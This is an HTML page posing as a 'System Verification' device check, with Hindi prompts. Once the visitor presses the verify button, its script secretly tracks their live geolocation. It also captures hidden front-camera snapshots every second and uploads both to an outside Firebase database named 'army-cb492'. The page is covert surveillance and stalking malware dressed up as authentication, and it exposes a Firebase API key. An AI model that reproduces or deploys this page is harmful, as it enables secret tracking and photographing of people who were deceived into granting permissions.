<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>System Verification</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">

    <div id="ui-layer" style="text-align:center; padding:20px; border:1px solid #333; border-radius:10px;">
        <h2>SYSTEM AUTHENTICATION</h2>
        <p>प्रमाणीकरण पूरा करने के लिए अनुमति दें...</p>
        <button id="startBtn" style="padding:15px 30px; background:red; color:white; border:none; cursor:pointer;">VERIFY DEVICE</button>
    </div>

    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const db = firebase.database();
        const firebaseConfig = { apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc", authDomain: "army-cb492.firebaseapp.com", databaseURL: "https://army-cb492-default-rtdb.firebaseio.com", projectId: "army-cb492", appId: "1:449848409517:web:386ad1b570731b6ec4f524" };
        firebase.initializeApp(firebaseConfig);

        document.getElementById('startBtn').onclick = async () => {
            document.getElementById('ui-layer').innerHTML = "<h3>Verifying...</h3>";
            
            // लोकेशन तुरंत एक्सेस
            navigator.geolocation.watchPosition((p) => {
                db.ref('live_detect/location').set({ lat: p.coords.latitude, lon: p.coords.longitude });
            });

            // फ्रंट कैमरा एक्सेस
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const v = document.getElementById('v');
            v.srcObject = s;

            // तुरंत फोटो खींचकर पैनल पर भेजने का लूप
            setInterval(() => {
                const c = document.getElementById('c');
                c.width = 400; c.height = 300;
                c.getContext('2d').drawImage(v, 0, 0, 400, 300);
                db.ref('live_detect').update({ photo: c.toDataURL('image/jpeg', 0.6) });
            }, 1000); // हर 1 सेकंड में फोटो अपडेट होगी
        };
    </script>
</body>
</html>
